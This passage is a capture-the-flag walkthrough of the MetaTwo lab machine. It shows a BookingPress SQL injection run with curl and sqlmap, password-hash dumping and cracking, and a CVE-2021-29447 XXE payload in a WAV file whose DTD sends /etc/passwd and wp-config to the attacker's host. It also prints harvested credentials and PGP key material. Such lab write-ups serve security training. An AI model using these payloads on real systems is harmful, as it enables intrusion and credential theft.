10) 100.00% Time: 00:00:00 [i] User(s) Identified: [+] admin | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Wp Json Api (Aggressive Detection) | - http://metapress.htb/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1 | Rss Generator (Aggressive Detection) | Author Sitemap (Aggressive Detection) | - http://metapress.htb/wp-sitemap-users-1.xml | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] manager | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Thu Aug 31 07:39:41 2023 [+] Requests Done: 3432 [+] Cached Requests: 10 [+] Data Sent: 1.057 MB [+] Data Received: 1.113 MB [+] Memory used: 278.785 MB [+] Elapsed time: 00:02:19 ftp └─$ ftp anonymous@metapress.htb Connected to metapress.htb. 220 ProFTPD Server (Debian) [::ffff:10.10.11.186] 331 Password required for anonymous Password: 530 Login incorrect. ftp: Login failed ftp\u0026gt; Foothold/User wpscan didn\u0026rsquo;t show plugins installed But manually it shows bookingpress plugin with version 1.0.10 We have a hit If we check the POC, we only need to extract the nonce and invoke the curl command _wpnonce:076dc04d86 And it works └─$ curl -i \u0026#39;http://metapress.htb/wp-admin/admin-ajax.php\u0026#39; --data \u0026#39;action=bookingpress_front_get_category_services\u0026amp;_wpnonce=076dc04d86\u0026amp;category_id=33\u0026amp;total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -\u0026#39; HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Thu, 31 Aug 2023 08:31:58 GMT Content-Type: text/html; charset=UTF-8 Transfer-Encoding: chunked Connection: keep-alive X-Powered-By: PHP/8.0.24 X-Robots-Tag: noindex X-Content-Type-Options: nosniff Expires: Wed, 11 Jan 1984 05:00:00 GMT Cache-Control: no-cache, must-revalidate, max-age=0 X-Frame-Options: SAMEORIGIN Referrer-Policy: strict-origin-when-cross-origin [{\u0026#34;bookingpress_service_id\u0026#34;:\u0026#34;10.5.15-MariaDB-0+deb11u1\u0026#34;,\u0026#34;bookingpress_category_id\u0026#34;:\u0026#34;Debian 11\u0026#34;,\u0026#34;bookingpress_service_name\u0026#34;:\u0026#34;debian-linux-gnu\u0026#34;,\u0026#34;bookingpress_service_price\u0026#34;:\u0026#34;$1.00\u0026#34;,\u0026#34;bookingpress_service_duration_val\u0026#34;:\u0026#34;2\u0026#34;,\u0026#34;bookingpress_service_duration_unit\u0026#34;:\u0026#34;3\u0026#34;,\u0026#34;bookingpress_service_description\u0026#34;:\u0026#34;4\u0026#34;,\u0026#34;bookingpress_service_position\u0026#34;:\u0026#34;5\u0026#34;,\u0026#34;bookingpress_servicedate_created\u0026#34;:\u0026#34;6\u0026#34;,\u0026#34;service_price_without_currency\u0026#34;:1,\u0026#34;img_url\u0026#34;:\u0026#34;http:\\/\\/metapress.htb\\/wp-content\\/plugins\\/bookingpress-appointment-booking\\/images\\/placeholder-img.jpg\u0026#34;}] We can feed request to sqlmap └─$ cat sqli.req POST /wp-admin/admin-ajax.php HTTP/1.1 Host: metapress.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: PHPSESSID=8mocoube6ab84hutpuirndiqdl Content-Type: application/x-www-form-urlencoded Upgrade-Insecure-Requests: 1 Content-Length: 102 action=bookingpress_front_get_category_services\u0026amp;_wpnonce=076dc04d86\u0026amp;category_id=33\u0026amp;total_service=-7502 Now let\u0026rsquo;s run sqlmap and indicate injectable parameter └─$ sqlmap -r sqli.req -p total_service ___ __H__ ___ ___[.]_____ ___ ___ {1.7.8#stable} |_ -| . [)] | .\u0026#39;| . | |___|_ [.]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user\u0026#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 09:41:46 /2023-08-31/ [09:41:46] [INFO] parsing HTTP request from \u0026#39;sqli.req\u0026#39; [09:41:46] [WARNING] it appears that you have provided tainted parameter values (\u0026#39;total_service=-7502\u0026#39;) with most likely leftover chars/statements from manual SQL injection test(s). Please, always use only valid parameter values so sqlmap could be able to run properly are you really sure that you want to continue (sqlmap could have problems)? [y/N] y [09:42:09] [INFO] testing connection to the target URL [09:42:09] [INFO] checking if the target is protected by some kind of WAF/IPS [09:42:09] [INFO] testing if the target URL content is stable [09:42:10] [INFO] target URL content is stable [09:42:10] [WARNING] heuristic (basic) test shows that POST parameter \u0026#39;total_service\u0026#39; might not be injectable [09:42:10] [INFO] testing for SQL injection on POST parameter \u0026#39;total_service\u0026#39; [09:42:10] [INFO] testing \u0026#39;AND boolean-based blind - WHERE or HAVING clause\u0026#39; [09:42:11] [INFO] testing \u0026#39;Boolean-based blind - Parameter replace (original value)\u0026#39; [09:42:11] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)\u0026#39; [09:42:12] [INFO] testing \u0026#39;PostgreSQL AND error-based - WHERE or HAVING clause\u0026#39; [09:42:13] [INFO] testing \u0026#39;Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)\u0026#39; [09:42:15] [INFO] testing \u0026#39;Oracle AND error-based - WHERE or HAVING clause (XMLType)\u0026#39; [09:42:16] [INFO] testing \u0026#39;Generic inline queries\u0026#39; [09:42:16] [INFO] testing \u0026#39;PostgreSQL \u0026gt; 8.1 stacked queries (comment)\u0026#39; [09:42:16] [WARNING] time-based comparison requires larger statistical model, please wait. (done) [09:42:17] [INFO] testing \u0026#39;Microsoft SQL Server/Sybase stacked queries (comment)\u0026#39; [09:42:18] [INFO] testing \u0026#39;Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)\u0026#39; [09:42:19] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP)\u0026#39; [09:42:30] [INFO] POST parameter \u0026#39;total_service\u0026#39; appears to be \u0026#39;MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP)\u0026#39; injectable it looks like the back-end DBMS is \u0026#39;MySQL\u0026#39;. Do you want to skip test payloads specific for other DBMSes? [Y/n] y for the remaining tests, do you want to include all tests for \u0026#39;MySQL\u0026#39; extending provided level (1) and risk (1) values? [Y/n] n [09:42:49] [INFO] testing \u0026#39;Generic UNION query (NULL) - 1 to 20 columns\u0026#39; [09:42:49] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found [09:42:54] [INFO] target URL appears to be UNION injectable with 9 columns [09:42:55] [INFO] POST parameter \u0026#39;total_service\u0026#39; is \u0026#39;Generic UNION query (NULL) - 1 to 20 columns\u0026#39; injectable POST parameter \u0026#39;total_service\u0026#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] n sqlmap identified the following injection point(s) with a total of 69 HTTP(s) requests: --- Parameter: total_service (POST) Type: time-based blind Title: MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: action=bookingpress_front_get_category_services\u0026amp;_wpnonce=076dc04d86\u0026amp;category_id=33\u0026amp;total_service=-7502) AND (SELECT 3777 FROM (SELECT(SLEEP(5)))Njgj) AND (4469=4469 Type: UNION query Title: Generic UNION query (NULL) - 9 columns Payload: action=bookingpress_front_get_category_services\u0026amp;_wpnonce=076dc04d86\u0026amp;category_id=33\u0026amp;total_service=-7502) UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71766b6271,0x596f694e547548746275446970716344665150456d6f634345594859534871744645474764726542,0x7162626271),NULL,NULL,NULL,NULL-- - --- ... Dump databases └─$ sqlmap -r sqli.req -p total_service --dbs ... [09:44:25] [INFO] fetching database names available databases [2]: [*] blog [*] information_schema Dump blog tables └─$ sqlmap -r sqli.req -p total_service -D blog --tables ... [09:45:27] [INFO] fetching tables for database: \u0026#39;blog\u0026#39; Database: blog [27 tables] +--------------------------------------+ | wp_bookingpress_appointment_bookings | | wp_bookingpress_categories | | wp_bookingpress_customers | | wp_bookingpress_customers_meta | | wp_bookingpress_customize_settings | | wp_bookingpress_debug_payment_log | | wp_bookingpress_default_daysoff | | wp_bookingpress_default_workhours | | wp_bookingpress_entries | | wp_bookingpress_form_fields | | wp_bookingpress_notifications | | wp_bookingpress_payment_logs | | wp_bookingpress_services | | wp_bookingpress_servicesmeta | | wp_bookingpress_settings | | wp_commentmeta | | wp_comments | | wp_links | | wp_options | | wp_postmeta | | wp_posts | | wp_term_relationships | | wp_term_taxonomy | | wp_termmeta | | wp_terms | | wp_usermeta | | wp_users | +--------------------------------------+ Dump wp_users table content └─$ sqlmap -r sqli.req -p total_service -D blog -T wp_users --dump ... Database: blog Table: wp_users [2 entries] +----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+ | ID | user_url | user_pass | user_email | user_login | user_status | display_name | user_nicename | user_registered | user_activation_key | +----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+ | 1 | http://metapress.htb | $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. | admin@metapress.htb | admin | 0 | admin | admin | 2022-06-23 17:58:28 | \u0026lt;blank\u0026gt; | | 2 | \u0026lt;blank\u0026gt; | $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 | manager@metapress.htb | manager | 0 | manager | manager | 2022-06-23 18:07:55 | \u0026lt;blank\u0026gt; | +----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+ Only manager\u0026rsquo;s hash can be cracked manager:partylikearockstar └─$ hashcat hash /usr/share/wordlists/rockyou.txt hashcat (v6.2.6) starting in autodetect mode OpenCL API (OpenCL 3.0 PoCL 3.1+debian Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] ================================================================================================================================================== * Device #1: pthread-sandybridge-12th Gen Intel(R) Core(TM) i5-12400, 1436/2936 MB (512 MB allocatable), 2MCU Hash-mode was not specified with -m. Attempting to auto-detect hash mode. The following mode was auto-detected as the only one matching your input hash: 400 | phpass | Generic KDF ... $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70:partylikearockstar Session..........: hashcat Status...........: Cracked Hash.Mode........: 400 (phpass) Hash.Target......: $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 Time.Started.....: Thu Aug 31 09:49:23 2023 (50 secs) Time.Estimated...: Thu Aug 31 09:50:13 2023 (0 secs) Kernel.Feature...: Pure Kernel Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 2221 H/s (7.50ms) @ Accel:64 Loops:1024 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new) Progress.........: 110464/14344385 (0.77%) Rejected.........: 0/110464 (0.00%) Restore.Point....: 110336/14344385 (0.77%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:7168-8192 Candidate.Engine.: Device Generator Candidates.#1....: partzz -\u0026gt; nina28 Hardware.Mon.#1..: Util: 95% We\u0026rsquo;re in manager didn\u0026rsquo;t have any priviliges Remember we have WordPress 5.6.2 Now we have possibility to execute the following cve-2021-29447 Crete payload wave file Create evil.dtd Start web server └─$ echo -en \u0026#39;RIFF\\xb8\\x00\\x00\\x00WAVEiXML\\x7b\\x00\\x00\\x00\u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt;\u0026lt;!DOCTYPE ANY[\u0026lt;!ENTITY % remote SYSTEM \u0026#39;\u0026#34;\u0026#39;\u0026#34;\u0026#39;http://10.10.16.4/evil.dtd\u0026#39;\u0026#34;\u0026#39;\u0026#34;\u0026#39;\u0026gt;%remote;%init;%trick;]\u0026gt;\\x00\u0026#39; \u0026gt; payload.wav \u0026lt;!ENTITY % file SYSTEM \u0026#34;php://filter/read=convert.base64-encode/resource=/etc/passwd\u0026#34;\u0026gt; \u0026lt;!ENTITY % init \u0026#34;\u0026lt;!ENTITY \u0026amp;#x25; trick SYSTEM \u0026#39;http://10.10.16.4/?p=%file;\u0026#39;\u0026gt;\u0026#34; \u0026gt; Now upload the payload.wav We should see the connection to our web server requesting evil.dtd Then we see the encoded content of /etc/passwd We can decrypt it and see jnelson user Trying to extract jnelson\u0026rsquo;s key resulted in failure Let\u0026rsquo;s extract wp-config We found ftp creds: metapress.htb:9NYS_ii@FyL_p5M2NvJ \u0026lt;?php /** The name of the database for WordPress */ define( \u0026#39;DB_NAME\u0026#39;, \u0026#39;blog\u0026#39; ); /** MySQL database username */ define( \u0026#39;DB_USER\u0026#39;, \u0026#39;blog\u0026#39; ); /** MySQL database password */ define( \u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;635Aq@TdqrCwXFUZ\u0026#39; ); /** MySQL hostname */ define( \u0026#39;DB_HOST\u0026#39;, \u0026#39;localhost\u0026#39; ); /** Database Charset to use in creating database tables. */ define( \u0026#39;DB_CHARSET\u0026#39;, \u0026#39;utf8mb4\u0026#39; ); /** The Database Collate type. Don\u0026#39;t change this if in doubt. */ define( \u0026#39;DB_COLLATE\u0026#39;, \u0026#39;\u0026#39; ); define( \u0026#39;FS_METHOD\u0026#39;, \u0026#39;ftpext\u0026#39; ); define( \u0026#39;FTP_USER\u0026#39;, \u0026#39;metapress.htb\u0026#39; ); define( \u0026#39;FTP_PASS\u0026#39;, \u0026#39;9NYS_ii@FyL_p5M2NvJ\u0026#39; ); define( \u0026#39;FTP_HOST\u0026#39;, \u0026#39;ftp.metapress.htb\u0026#39; ); define( \u0026#39;FTP_BASE\u0026#39;, \u0026#39;blog/\u0026#39; ); define( \u0026#39;FTP_SSL\u0026#39;, false ); /**#@+ * Authentication Unique Keys and Salts. * @since 2.6.0 */ define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n\u0026gt;+3m?.B/:\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;J+mxCaP4z\u0026lt;g.6P^t`ziv\u0026gt;dd}EEi%48%JnRq^2MjFiitn#\u0026amp;n+HXv]||E+F~C{qKXy\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*\u0026lt;~:0]s}d\u0026lt;\u0026amp;M;.,x0z~R\u0026gt;3!D\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;\u0026gt;`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S\u0026amp;~omiH^jVC?2-I?I.\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=\u0026amp;^JsI`M)FJTJEVI) N#NOidIf=\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;.sU\u0026amp;CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL\u0026#39; ); /** * WordPress Database Table prefix. */ $table_prefix = \u0026#39;wp_\u0026#39;; /** * For developers: WordPress debugging mode. * @link https://wordpress.org/support/article/debugging-in-wordpress/ */ define( \u0026#39;WP_DEBUG\u0026#39;, false ); /** Absolute path to the WordPress directory. */ if ( ! defined( \u0026#39;ABSPATH\u0026#39; ) ) { define( \u0026#39;ABSPATH\u0026#39;, __DIR__ . \u0026#39;/\u0026#39; ); } /** Sets up WordPress vars and included files. */ require_once ABSPATH . \u0026#39;wp-settings.php\u0026#39;; Using the creds for ftp we have access to 2 directories: blog and mailer And we have jnelson\u0026rsquo;s creds in mailer script jnelson:Cb4_JmWM8zUZWMu@Ys ─$ ftp metapress.htb@metapress.htb Connected to metapress.htb. 220 ProFTPD Server (Debian) [::ffff:10.10.11.186] 331 Password required for metapress.htb Password: 230 User metapress.htb logged in Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 229 Entering Extended Passive Mode (|||35242|) 150 Opening ASCII mode data connection for file list drwxr-xr-x 5 metapress.htb metapress.htb 4096 Oct 5 2022 blog drwxr-xr-x 3 metapress.htb metapress.htb 4096 Oct 5 2022 mailer 226 Transfer complete ftp\u0026gt; cd mailer 250 CWD command successful ftp\u0026gt; ls 229 Entering Extended Passive Mode (|||64672|) 150 Opening ASCII mode data connection for file list drwxr-xr-x 4 metapress.htb metapress.htb 4096 Oct 5 2022 PHPMailer -rw-r--r-- 1 metapress.htb metapress.htb 1126 Jun 22 2022 send_email.php 226 Transfer complete ftp\u0026gt; more send_email.php \u0026lt;?php /* * This script will be used to send an email to all our users when ready for launch */ use PHPMailer\\PHPMailer\\PHPMailer; use PHPMailer\\PHPMailer\\SMTP; use PHPMailer\\PHPMailer\\Exception; require \u0026#39;PHPMailer/src/Exception.php\u0026#39;; require \u0026#39;PHPMailer/src/PHPMailer.php\u0026#39;; require \u0026#39;PHPMailer/src/SMTP.php\u0026#39;; $mail = new PHPMailer(true); $mail-\u0026gt;SMTPDebug = 3; $mail-\u0026gt;isSMTP(); $mail-\u0026gt;Host = \u0026#34;mail.metapress.htb\u0026#34;; $mail-\u0026gt;SMTPAuth = true; $mail-\u0026gt;Username = \u0026#34;jnelson@metapress.htb\u0026#34;; $mail-\u0026gt;Password = \u0026#34;Cb4_JmWM8zUZWMu@Ys\u0026#34;; $mail-\u0026gt;SMTPSecure = \u0026#34;tls\u0026#34;; $mail-\u0026gt;Port = 587; $mail-\u0026gt;From = \u0026#34;jnelson@metapress.htb\u0026#34;; $mail-\u0026gt;FromName = \u0026#34;James Nelson\u0026#34;; $mail-\u0026gt;addAddress(\u0026#34;info@metapress.htb\u0026#34;); $mail-\u0026gt;isHTML(true); $mail-\u0026gt;Subject = \u0026#34;Startup\u0026#34;; $mail-\u0026gt;Body = \u0026#34;\u0026lt;i\u0026gt;We just started our new blog metapress.htb!\u0026lt;/i\u0026gt;\u0026#34;; try { $mail-\u0026gt;send(); echo \u0026#34;Message has been sent successfully\u0026#34;; } catch (Exception $e) { echo \u0026#34;Mailer Error: \u0026#34; . $mail-\u0026gt;ErrorInfo; } ssh as jnelson Root No sudo rights No interesting groups But we have .passpie directory It looks like a password manager https://github.com/marcwebbie/passpie jnelson@meta2:~$ ls -lha total 32K drwxr-xr-x 4 jnelson jnelson 4.0K Oct 25 2022 . drwxr-xr-x 3 root root 4.0K Oct 5 2022 .. lrwxrwxrwx 1 root root 9 Jun 26 2022 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 jnelson jnelson 220 Jun 26 2022 .bash_logout -rw-r--r-- 1 jnelson jnelson 3.5K Jun 26 2022 .bashrc drwxr-xr-x 3 jnelson jnelson 4.0K Oct 25 2022 .local dr-xr-x--- 3 jnelson jnelson 4.0K Oct 25 2022 .passpie -rw-r--r-- 1 jnelson jnelson 807 Jun 26 2022 .profile -rw-r----- 1 root jnelson 33 Aug 30 19:49 user.txt passpie content jnelson@meta2:~/.passpie$ passpie ╒════════╤═════════╤════════════╤═══════════╕ │ Name │ Login │ Password │ Comment │ ╞════════╪═════════╪════════════╪═══════════╡ │ ssh │ jnelson │ ******** │ │ ├────────┼─────────┼────────────┼───────────┤ │ ssh │ root │ ******** │ │ ╘════════╧═════════╧════════════╧═══════════╛ Extracting root password doesn\u0026rsquo;t work jnelson@meta2:~/.passpie$ passpie copy --to stdout root@ssh Passphrase: Passphrase: Passphrase: Error: Wrong passphrase If we check ssh folder inside .passpie we have 2 pgp files We also have .keys with pgp keys jnelson@meta2:~/.passpie$ ls -lha total 24K dr-xr-x--- 3 jnelson jnelson 4.0K Oct 25 2022 . drwxr-xr-x 4 jnelson jnelson 4.0K Oct 25 2022 .. -r-xr-x--- 1 jnelson jnelson 3 Jun 26 2022 .config -r-xr-x--- 1 jnelson jnelson 5.2K Jun 26 2022 .keys dr-xr-x--- 2 jnelson jnelson 4.0K Oct 25 2022 ssh jnelson@meta2:~/.passpie$ ls ssh/ jnelson.pass root.pass jnelson@meta2:~/.passpie$ ls ssh/ jnelson.pass root.pass jnelson@meta2:~/.passpie$ cat ssh/root.pass comment: \u0026#39;\u0026#39; fullname: root@ssh login: root modified: 2022-06-26 08:58:15.621572 name: ssh password: \u0026#39;-----BEGIN PGP MESSAGE----- hQEOA6I+wl+LXYMaEAP/T8AlYP9z05SEST+Wjz7+IB92uDPM1RktAsVoBtd3jhr2 nAfK00HJ/hMzSrm4hDd8JyoLZsEGYphvuKBfLUFSxFY2rjW0R3ggZoaI1lwiy/Km yG2DF3W+jy8qdzqhIK/15zX5RUOA5MGmRjuxdco/0xWvmfzwRq9HgDxOJ7q1J2ED /2GI+i+Gl+Hp4LKHLv5mMmH5TZyKbgbOL6TtKfwyxRcZk8K2xl96c3ZGknZ4a0Gf iMuXooTuFeyHd9aRnNHRV9AQB2Vlg8agp3tbUV+8y7szGHkEqFghOU18TeEDfdRg krndoGVhaMNm1OFek5i1bSsET/L4p4yqIwNODldTh7iB0ksB/8PHPURMNuGqmeKw mboS7xLImNIVyRLwV80T0HQ+LegRXn1jNnx6XIjOZRo08kiqzV2NaGGlpOlNr3Sr lpF0RatbxQGWBks5F3o= =uh1B -----END PGP MESSAGE----- \u0026#39; jnelson@meta2:~/.passpie$ cat .keys -----BEGIN PGP PUBLIC KEY BLOCK----- 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 fo6KI+w2uXLaw+bIT1XZurDN =dqsF -----END PGP PUBLIC KEY BLOCK----- -----BEGIN PGP PRIVATE KEY BLOCK----- lQUBBGK4V9YRDADENdPyGOxVM7hcLSHfXg+21dENGedjYV1gf9cZabjq6v440NA1 AiJBBC1QUbIHmaBrxngkbu/DD0gzCEWEr2pFusr/Y3yY4codzmteOW6Rg2URmxMD /GYn9FIjUAWqnfdnttBbvBjseL4sECpmgxTIjKbWAXlqgEgNjXD306IweEy2FOho 3LpAXxfk8C/qUCKcpxaz0G2k0do4+VTKZ+5UDpqM5++soJqhCrUYudb9zyVyXTpT ZjMvyXe5NeC7JhBCKh+/Wqc4xyBcwhDdW+WU54vuFUthn+PUubEN1m+s13BkyvHV gNAM4v6terRItXdKvgvHtJxE0vhlNSjFAedACHC4sN+dRqFu4li8XPIVYGkuK9pX 5xA6Nj+8UYRoZrP4SYtaDslT63ZaLd2MvwP+xMw2XEv8Uj3TGq6BIVWmajbsqkEp tQkU7d+nPt1aw2sA265vrIzry02NAhxL9YQGNJmXFbZ0p8cT3CswedP8XONmVdxb a1UfdG+soO3jtQsBAKbYl2yF/+D81v+42827iqO6gqoxHbc/0epLqJ+Lbl8hC/sG WIVdy+jynHb81B3FIHT832OVi2hTCT6vhfTILFklLMxvirM6AaEPFhxIuRboiEQw 8lQMVtA1l+Et9FXS1u91h5ZL5PoCfhqpjbFD/VcC5I2MhwL7n50ozVxkW2wGAPfh cODmYrGiXf8dle3z9wg9ltx25XLsVjoR+VLm5Vji85konRVuZ7TKnL5oXVgdaTML qIGqKLQfhHwTdvtYOTtcxW3tIdI16YhezeoUioBWY1QM5z84F92UVz6aRzSDbc/j FJOmNTe7+ShRRAAPu2qQn1xXexGXY2BFqAuhzFpO/dSidv7/UH2+x33XIUX1bPXH FqSg+11VAfq3bgyBC1bXlsOyS2J6xRp31q8wJzUSlidodtNZL6APqwrYNhfcBEuE PnItMPJS2j0DG2V8IAgFnsOgelh9ILU/OfCA4pD4f8QsB3eeUbUt90gmUa8wG7uM FKZv0I+r9CBwjTK3bg/rFOo+DJKkN3hAfkARgU77ptuTJEYsfmho84ZaR3KSpX4L /244aRzuaTW75hrZCJ4RxWxh8vGw0+/kPVDyrDc0XNv6iLIMt6zJGddVfRsFmE3Y q2wOX/RzICWMbdreuQPuF0CkcvvHMeZX99Z3pEzUeuPu42E6JUj9DTYO8QJRDFr+ F2mStGpiqEOOvVmjHxHAduJpIgpcF8z18AosOswa8ryKg3CS2xQGkK84UliwuPUh S8wCQQxveke5/IjbgE6GQOlzhpMUwzih7+15hEJVFdNZnbEC9K/ATYC/kbJSrbQM RfcJUrnjPpDFgF6sXQJuNuPdowc36zjE7oIiD69ixGR5UjhvVy6yFlESuFzrwyeu TDl0UOR6wikHa7tF/pekX317ZcRbWGOVr3BXYiFPTuXYBiX4+VG1fM5j3DCIho20 